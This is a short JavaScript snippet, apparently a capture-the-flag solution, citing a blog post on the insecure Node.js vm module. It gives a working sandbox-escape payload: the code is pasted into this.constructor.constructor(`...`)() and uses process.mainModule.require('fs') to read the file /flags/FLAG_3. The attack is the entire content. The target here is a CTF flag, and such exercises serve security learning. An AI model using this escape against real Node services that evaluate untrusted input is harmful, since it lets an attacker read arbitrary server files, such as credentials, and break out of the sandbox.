// https://thegoodhacker.com/posts/the-unsecure-node-vm-module/

/*  Paste the following code inside of the backticks (`)
this.constructor.constructor(`
    // HERE
`)()
*/

const fs = process.mainModule.require('fs');
return fs.readFileSync('/flags/FLAG_3');